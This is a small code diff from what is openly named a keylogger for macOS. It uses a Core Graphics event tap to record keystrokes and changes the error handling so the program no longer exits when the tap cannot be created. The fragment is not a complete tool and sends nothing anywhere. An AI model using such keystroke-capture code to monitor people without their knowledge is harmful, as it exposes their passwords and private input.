@@ -20,14 +20,16 @@ namespace KeyLogger {
 
         if(!eventTap) {
             printf("ERROR: Unable to create event tap.\n");
-            exit(1);
-        }
+            // exit(1);
+
+        } else {
 
         CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
         CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
         CGEventTapEnable(eventTap, true);
 
         printf("Keystrokes are now being recorded\n");
+        }
     }
 
     void Run() {
